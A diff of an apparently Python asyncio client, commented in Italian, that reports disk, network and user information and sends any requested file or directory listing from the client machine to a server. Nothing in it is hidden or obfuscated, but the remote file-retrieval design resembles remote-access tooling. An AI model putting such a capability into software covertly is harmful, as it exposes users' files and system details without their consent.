@@ -27,7 +27,8 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
                   "6": b"<Partition-disk-status>", "6-1": b"<Partition-disk-read-status>", "6-2": b"<Partition-disk-write-status>",
                   "7": b"<Network-info>", "7-1": b"<Network-Interface>", "7-2": b"<Network-IP>", "7-3": b"<Network-NetMask>", "7-4": b"<Network-Broadcast>",
                   "8": b"<Users>", "8-1": b"<Users-Name>", "8-2": b"<Users-Active-Since>",
-                  "9": b"<Content-Path>"}
+                  "9": b"<Content-Path>",
+                  "10": b"<Waiting-For-File>"}
 
 __os_dict_types = {0: "linux", 1: "win32", 2: "darwin"}  # Partiamo da 0 in modo da porte accedere al'i-esimo elemento nella lista contenuta in __filesystem_hierarchy
 
@@ -137,19 +138,22 @@ async def send_file(request: str, size: int, writer: asyncio.StreamWriter):
     """Invio di uno specifico file dal client al server."""
     if os.path.exists(os.path.abspath(request)):  # Controlliamo che il file richiesto esista
         # Nel caso in cui il file esista calcoliamo una dimensione (utilizzato per definire la dimensione di ogni chunk) che rispetti il pacchetto che stiamo inviando al server
-        final_size = size - len(__headers_type["1"]) - len(__headers_type["1-1"]) - len(request)
+
+        final_request = request if os.path.isabs(request) is False else os.path.basename(request)
+
+        final_size = size - len(__headers_type["1"]) - len(__headers_type["1-1"]) - len(final_request)
         with open(request, 'rb') as filename:
             for chunk in iter(lambda: filename.read(final_size), ""):
                 if chunk:
                     # L'ogetto che riceverà il client sarà del tipo <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
-                    writer.write(__headers_type["1"] + request.encode() + __headers_type["1-1"] + chunk)
+                    writer.write(__headers_type["1"] + final_request.encode() + __headers_type["1-1"] + chunk)
                     await asyncio.sleep(2)  # Controllare se sia possibile diminuire lo sleep (o se sia invece obbligatorio aumentarlo)
                     print(f"Sent: {len(chunk)} bytes")
                 else:
                     break
     else:
         print("Request failed")
-        writer.write(__headers_type["3"] + request.encode())
+        writer.write(__headers_type["1-2"] + request.encode())
 
 
 async def send_dir_content(request: str, os_type: int, writer: asyncio.StreamWriter):
@@ -157,9 +161,10 @@ async def send_dir_content(request: str, os_type: int, writer: asyncio.StreamWri
     for files in get_path_content(request, os_type):  # Utilizziamo la variabile globale che viene settata all'avvio del client
         writer.write(__headers_type["9"] + files.encode())
         await asyncio.sleep(1)
+    writer.write(__headers_type["10"])
 
 
-# TODO: Modificare o espandere
+# TODO: ELIMINARE
 def get_hostname() -> str:
     """Recupero info hostname."""
     return socket.gethostname()
